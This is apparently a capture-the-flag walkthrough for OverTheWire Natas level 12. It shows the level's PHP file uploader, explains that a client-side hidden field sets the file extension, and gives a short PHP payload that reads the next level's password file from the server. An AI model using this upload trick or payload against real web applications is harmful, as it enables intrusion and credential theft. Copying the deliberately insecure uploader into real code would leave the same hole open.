# Level 12


URL : http://natas12.natas.labs.overthewire.org/


## Solution

here is the source code for the uploader:

```php
<?
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

```

The code above is just the uploader, since there are no restrictions, except that the file size must be less than 1KB.  
we can upload any code we want, we only need to change one small thing


```php
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?> 
```

On the third line: there is a hidden input with the name of **filename**. its the input responsible for the filename.
the value is set to `getRandomString().jpg`, and since its on the client side, we will change that to .php


#### Example PHP exploit code 

I have included the php file here.

```php
<?php
    include '/etc/natas_webpass/natas13';
?>
```

After changing .jpg to .php we can now upload our php file `exp.php`.

After you can visit the file you uploaded and get the flag : password for natas13.

